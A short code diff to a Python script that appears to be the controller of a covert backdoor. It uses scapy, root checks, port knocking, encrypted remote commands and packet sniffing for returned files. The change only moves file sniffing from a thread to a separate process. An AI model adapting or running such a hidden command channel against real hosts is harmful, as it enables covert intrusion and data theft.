@@ -1,9 +1,8 @@
 #!/usr/bin/python
 
-import time, configfile, logging, encryption, helpers
+import time, configfile, logging, encryption, helpers, multiprocessing
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
-from threading import Thread
 
 # flag to determine when to stop reading the results of a command and decrypt everything
 flag = False
@@ -55,8 +54,8 @@ def main():
     checkRoot()
     portKnock()
 
-    thread = Thread(target=sniffForFile())
-    thread.start()
+    fileProcess = multiprocessing.Process(target=sniffForFile)
+    fileProcess.start()
 
     while 1:
         command = raw_input("Enter command: ")
